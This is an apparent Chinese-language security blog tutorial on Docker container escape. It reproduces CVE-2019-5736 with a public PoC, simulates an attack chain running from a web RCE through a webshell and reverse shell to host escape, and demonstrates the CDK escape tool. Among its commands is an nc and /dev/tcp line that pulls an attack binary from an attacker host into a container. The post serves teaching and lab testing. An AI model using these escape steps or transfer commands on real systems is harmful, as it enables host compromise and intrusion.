#  【云安全】云原生-Docker（五）容器逃逸之漏洞利用   
 sec0nd安全   2025-01-26 11:37  
  
   
# 漏洞利用逃逸  
#   
  
通过漏洞利用实现逃逸，主要分为以下两种方式：  
  
## 1、操作系统层面的内核漏洞  
##   
  
这是利用宿主机操作系统内核中的安全漏洞，直接突破容器的隔离机制，获得宿主机的权限。  
  
  
攻击原理：容器本质上是通过 Linux 的 cgroups 和 namespace 提供隔离，而这些功能依赖于内核。因此，内核漏洞可能被用来突破隔离，攻击者可以直接访问宿主机。  
  
  
常用漏洞：  
  
  
Dirty COW (CVE-2016-5195)：Linux 内核的写时复制 (Copy-On-Write) 漏洞，攻击者可以通过漏洞实现提权，影响宿主机。  
  
  
OverlayFS 漏洞 (如 CVE-2021-3493)：OverlayFS 文件系统中的权限校验漏洞，允许容器突破文件系统限制访问宿主机。  
  
  
权限提升漏洞 (如 CVE-2022-0847)：又名“Dirty Pipe”，允许攻击者通过文件写入操作实现提权。  
  
  
其它：CVE-2019-16884、CVE-2021-22555、CVE-2022-0492、CVE-2022-23222等  
  
> 系统内核漏洞并非 Docker 容器逃逸的“专属”利用方式，而是通用的一种权限提升技术。在 Web 安全或本地提权攻击场景中，内核漏洞同样可以被用来获取更高的系统权限。本章节属于云安全Docker内容，因此，内核漏洞的利用本文不做具体讨论。  
  
##   
## 2、Docker自身版本漏洞  
##   
  
Docker 本身作为容器管理工具，可能存在漏洞或实现上的不足，攻击者可以通过漏洞逃逸出容器环境，直接控制宿主机。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1Uh0sDAlPcibLbECYFYEKiceVqSUzfyTrXXyrdukSiaPh5t1ZEKEy2B9yj5Q/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
常用漏洞：  
  
### CVE-2019-5736  
###   
  
攻击者通过覆盖容器内的 runc 二进制文件，可以执行任意代码并控制宿主机。  
  
#### 利用条件  
####   
  
(1)版本：Docker version <= 18.09.2，RunC version <= 1.0-rc6   
  
(2)需要管理员再次进入容器触发  
  
#### 漏洞复现  
####   
  
a.首先卸载原有docker  
```
sudo apt-get purge -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-ce-rootless-extras
sudo rm -rf /var/lib/docker
sudo rm -rf /var/lib/containerd
sudo rm /etc/apt/sources.list.d/docker.list
sudo rm /etc/apt/keyrings/docker.asc
```  
  
  
b.安装漏洞对应版本  
```
apt-get update
apt-get install -y apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
apt-get update
apt-cache madison docker-ce
apt-get install docker-ce=18.06.1~ce~3-0~ubuntu
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhKa4BWu76IwanVUcia0ZiaApG6MoBrtk5iawKZm3S1Aic2cJt69RPRHPeeg/640?wx_fmt=png&from=appmsg "")  
  
  
c.编译exp ，项目地址  
  
```
https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go
```  
```

```  
  
  
下载EXP后修改  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhaC0nN1sHPHKIxrbUubxOMD9m4Zm3TXhL30uqE3WHJRrrTxGxpKP7aA/640?wx_fmt=png&from=appmsg "")  
  
  
  
使用如下命令进行编译EXP  
```
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1Uh2E9p9FMkl0m1UkicHT5eiaLs8Iq6ic292Aap6cqqTibWGekEuLNKibLSmzA/640?wx_fmt=png&from=appmsg "")  
  
  
  
d.准备另一台主机进行监听，上传EXP到容器，执行  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhEb62pgakaUPq904soq9vvQiaCCuBe53oSsr0EyI9OpuDiateoqX6GQVw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhFYiaqQ2UPMs7mcAIqexgPx0lX4bw8ic0CAp4zN2vM3R3KdlCJoicQ2Fgg/640?wx_fmt=png&from=appmsg "")  
  
  
  
e. 模拟管理员进入容器，触发EXP执行，成功反弹shell，复现完毕  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhYrxWbq8WxQ1SPrWVDL7uY4ydtVLCtVMKvQHfib0OxFjWXPaOP6pJo7Q/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhwzUnx5Bh1vOzrP7lWABUGn9hEJDkHwOhGMWcAJWGkf1Mps5CRNv2Hw/640?wx_fmt=png&from=appmsg "")  
  
  
#### 模拟实战  
####   
  
受害者搭建网站  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1Uhh9ibqYicEnmtCZLMSon6yNMk5mcboxP1gdV7EzMMd3XOWuFuCa6UGk2g/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhtzMa8AtPX5h2RRllIEcgaT8L0KyebR8RgUPxDib5oufMCIGNZRicR8mA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
攻击者发现存在 Spring Cloud Gateway 命令执行漏洞  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhstdVHl4VdGcbR8ykxQl93L2IFtqslyI81YmyicV5kPJNKTkoacRzxTw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
发现是容器root权限  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1Uh4qolHYS67OUKiabaw9wSetNMjsQ09SI8NFut6jQiaZ0LOMC8Q4Fib59Qg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhtoH7u6PvoiavAuukibvicBT51OTOnHic7DAH7oNE35awusKOkMwtkvgL9A/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
植入内存马，使用哥斯拉连接  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhFuo6TjOfrGIr0iaiaeiawOQpianhaEgtoXuicAl2cbPy8FD4tezU9DqHkFw/640?wx_fmt=png&from=appmsg "")  
  
  
使用哥斯拉的远程下载功能，下载EXP，并赋予执行权限  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1Uhg0Fyhz1COx2uEcO81iaIaZCVvL51ntXEDM9ZibBa9BialicotDOEicxastw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhflCTia9zKhYcAbyicyibRHDOKgqu302aaR8LgpQx5IuYN1FaB7xQGuvtw/640?wx_fmt=png&from=appmsg "")  
  
  
监听、执行→管理员进入容器→成功逃逸  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhIPfjnGUhF2xXibVZuqe14SJgKia4CXBZBS6PicpqK9ZlXYA0btmVplvhA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhicBKkT4ewybuBBSnHnNUvaqI00y7aYWwlTibicUIaicdwwOtxBV3ajhAcA/640?wx_fmt=png&from=appmsg "")  
  
  
### CVE-2020-15257  
###   
  
该漏洞出现在 containerd 的 CRI plugin（容器运行时接口插件）中。攻击者可以通过创建特定配置的容器，将 cgroups（控制组）的 pids.max 参数设置为无效值。当 containerd 尝试写入这个值时，会导致内核返回错误。这可能使 containerd 的内部机制中断，从而允许攻击者进一步利用该错误实现权限提升。  
  
#### 利用条件  
####   
  
(1)版本：containerd < 1.4.3，containerd < 1.3.9（  
不含1.3.9 和 1.4.3  
）  
  
(2)容器权限为root，且以  
 --net=host 模式启动  
  
#### 模拟复现  
####   
  
a. 受害者安装的  
containerd  
版本为漏洞版本  
```
apt-get update
apt-get install ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial stable"
apt-get update
apt-cache madison docker-ce
apt-get install docker-ce=5:19.03.6~3-0~ubuntu-xenial docker-ce-cli=5:19.03.6~3-0~ubuntu-xenial containerd.io=1.2.4-1
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhHxe1g7oSUC60BfO6UWNUE8sGo3ibmsmLiblQqyeXcEdmx7KSpl76Hc6A/640?wx_fmt=png&from=appmsg "")  
  
  
b.受害者基于以上环境搭建的网站，存在struts2漏洞  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1Uh8n8XNu8AestTQ1c3RSbUFns4NaK2TSXHTe7QEP2K2qnOwKOEyafe4A/640?wx_fmt=png&from=appmsg "")  
  
  
c. 攻击者发现漏洞。执行命令，发现是容器环境，权限为容器root  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhXIUEKh7N4dOv0icvLsO27UCopgCCibMFqh3slrKe0wt2nM4MPjH1FYJQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhKWKvtKjSdxENXPkS8yYOqx13woxbPXCw0rkxAsA5Ot8A2PEF2PRpLA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhSJ94HbmQ9LU7Jks20Jt6nRqibzSeWdpzWkrZiatnuw7icpFmDrswbnibsA/640?wx_fmt=png&from=appmsg "")  
  
  
  
d.攻击者反弹shell后，在受害者容器内下载CDK项目  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1Uh7jZT9x6vibvUMfr1paiaS6EcrFQicSaqico5J4dBxjfpyFY7Cmv7UiarUgQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
e.后续利用，搜寻教程和资料说是可以借助自动化项目CDK进行容器逃逸。但是，不知道哪里出了问题，该漏洞我未能复现成功，猜测是各大云厂商做了安全优化，一路上各种报错，如果哪位大佬知道其中的缘由，还望告知！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhZqzicEW9v3meMwah3034QuFTk3PwYpwZYMmzHdFlzytQvHY9A8OemBQ/640?wx_fmt=png&from=appmsg "")  
  
###   
### 自动化项目：CDK  
###   
  
项目链接  
```
https://github.com/cdk-team/CDK
```  
> CDK是一款为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及PoC/EXP。集成Docker/K8s场景特有的 逃逸、横向移动、持久化利用方式，插件化管理。   
  
####   
#### 下载/植入  
####   
  
（1）在目标容器内直接wget或者curl  
  
（2）通过公网主机nc重定向  
```

```  
```
A主机：nc -lvp 999 < cdk
B主机：cat < /dev/tcp/A主机IP/999 > cdk
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhvzrzLUiaUQnwyvcgPSl8OFxN8yA150Om6KcgVMzlcBPDEcunicJvIDXg/640?wx_fmt=png&from=appmsg "")  
  
   
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhVYBgVrR8WCxlia3ErV0UQqUL55FvLYu9NQAhYyPsFBzic2SqPdIMWu9A/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
#### 功能模块  
  
> Evaluate: 容器内部信息收集，以发现潜在的弱点便于后续利用。  
> Exploit: 提供容器逃逸、持久化、横向移动等利用方式。  
> Tool: 修复渗透过程中常用的linux命令以及与Docker/K8s API交互的命令。  
  
  
  
#### 使用测试  
####   
  
以特权模式启动一个容器  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhkavibUt3Eicl1GNnwdYgBtMnQBicnAqYVGcY0E8q6WcPJgWggbGYENyPQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
在容器中下载CDK  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhhBqH3lzIQhwkNzgl2WnYZ10gPHKOyDYGR28XdCJVoJsdPf4OveeQ5g/640?wx_fmt=png&from=appmsg "")  
  
  
信息收集  
```
./cdk eva
```  
  
  
发现特权模式  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1Uhmsl2Bjd0hfyH8oeEcWPUDrPo2aiaNohcKyhCRiaVG7PS1rtel9Lvottw/640?wx_fmt=png&from=appmsg "")  
  
  
特权模式利用  
```
 ./cdk run mount-disk
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1UhBBDswJVOaJ77qzKqPcRLT9QkHYxhpgThn8v5TSgc1DYr7XKnSxwg4g/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1Uhxm3P8OhMNvmU7GicQ7t2o7N7TOoK5nUdZHD4E5nVrxsQl40h4Qefia7g/640?wx_fmt=png&from=appmsg "")  
  
  
使用自动逃逸也是没问题的  
```
 ./cdk  auto-escape id
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFJAJHOkIQXCRLCmyZJRp1Uhcic0d9sbBLa8WYVgLyzbHpPS6s4LudbVxrVhejVzmibRq44Q86FwyUoA/640?wx_fmt=png&from=appmsg "")  
  
  
Ps：该项目还是很强大的，经测试，特权模式、危险挂载均可以检查并利用，师傅们可自行测试。  
  
  
# 结尾  
#   
  
至此，Docker安全问题分析结束，下一篇开始，讨论容器编排工具k8s的安全问题  
  
  
